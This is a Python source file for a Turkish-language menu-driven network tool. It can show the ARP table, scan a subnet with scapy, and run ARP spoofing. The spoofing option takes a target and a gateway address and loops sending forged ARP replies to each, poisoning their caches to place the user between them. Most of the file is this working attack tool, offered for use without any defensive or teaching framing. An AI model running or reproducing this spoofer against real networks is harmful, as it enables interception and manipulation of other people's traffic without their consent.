import socket
import struct
import time
import threading
import os
from rich.console import Console
from rich.table import Table

console = Console()


def get_mac(ip):
    if os.name == "nt":
        import subprocess
        result = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if ip in line:
                parts = line.split()
                for part in parts:
                    if "-" in part and len(part) == 17:
                        return part
    return None


def arp_spoof_info():
    console.print()
    console.print(f"  [bold purple]🌙 ARP SPOOF BILGI[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"  [dim]  ARP Spoofing icin scapy gereklidir.[/dim]")
    console.print(f"  [dim]  pip install scapy[/dim]")
    console.print()


def run():
    console.print()
    console.print(f"  [bold purple]🌙 ARP SPOOFING[/bold purple]")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
    console.print(f"   [#a78bfa][1][/#a78bfa] ARP Tablo Goruntule")
    console.print(f"   [#a78bfa][2][/#a78bfa] ARP Spoof Baslat")
    console.print(f"   [#a78bfa][3][/#a78bfa] Ag Tarama")
    console.print(f"   [#a78bfa][0][/#a78bfa] Geri don")
    console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

    choice = console.input("\n[bold white]  Secim: [/bold white]").strip()

    if choice == "0":
        return

    if choice == "1":
        import subprocess
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        table = Table(title="🌕 ARP Tablosu", border_style="purple", show_header=True, header_style="bold magenta")
        table.add_column("IP Adresi", style="white", min_width=16)
        table.add_column("MAC Adresi", style="#a78bfa", min_width=18)
        table.add_column("Tip", style="dim", min_width=10)

        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3:
                ip_part = parts[0]
                if "." in ip_part and not ip_part.startswith("Interface"):
                    mac = parts[1] if "-" in parts[1] else (parts[1] if ":" in parts[1] else "-")
                    tip = parts[2] if len(parts) > 2 else "-"
                    table.add_row(ip_part, mac, tip)

        console.print()
        console.print(table)

    elif choice == "2":
        try:
            from scapy.all import ARP, Ether, send, get_if_hwaddr, conf
        except ImportError:
            console.print("[red]  scapy yuklu degil. pip install scapy[/red]")
            return

        target_ip = console.input("[bold white]  Hedef IP: [/bold white]").strip()
        gateway_ip = console.input("[bold white]  Gateway IP: [/bold white]").strip()

        if not target_ip or not gateway_ip:
            console.print("[red]  IP adresleri gerekli.[/red]")
            return

        console.print(f"\n[bold yellow]  ARP Spoofing baslatildi: {target_ip} <-> {gateway_ip}[/bold yellow]")
        console.print("[dim]  Ctrl+C ile durdurun.[/dim]")

        try:
            sent = 0
            while True:
                send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip), verbose=False)
                send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip), verbose=False)
                sent += 2
                console.print(f"\r[magenta]  Paket gonderildi: {sent}[/magenta]", end="")
                time.sleep(1)
        except KeyboardInterrupt:
            console.print(f"\n[#a78bfa]  ARP Spoof durduruldu. {sent} paket gonderildi.[/#a78bfa]")
            send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip), count=5, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip), count=5, verbose=False)

    elif choice == "3":
        try:
            from scapy.all import ARP, Ether, srp
        except ImportError:
            console.print("[red]  scapy yuklu degil. pip install scapy[/red]")
            return

        network = console.input("[bold white]  Ag (orn: 192.168.1.0/24): [/bold white]").strip()
        if not network:
            console.print("[red]  Ag adresi gerekli.[/red]")
            return

        with console.status("[magenta]  Ag taraniyor...[/magenta]", spinner="moon"):
            answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network), timeout=3, verbose=False)

        if answered:
            table = Table(title=f"🌕 Ag Tarama - {network}", border_style="purple", show_header=True, header_style="bold magenta")
            table.add_column("#", style="bold white", justify="center", width=4)
            table.add_column("IP", style="white", min_width=16)
            table.add_column("MAC", style="#a78bfa", min_width=18)

            for idx, (sent, recv) in enumerate(answered, 1):
                table.add_row(str(idx), recv.psrc, recv.hwsrc)

            console.print()
            console.print(table)
            console.print(f"\n[#a78bfa]  {len(answered)} cihaz bulundu.[/#a78bfa]")
        else:
            console.print("[dim]  Cihaz bulunamadi.[/dim]")

    else:
        console.print("[red]  Gecersiz secim.[/red]")
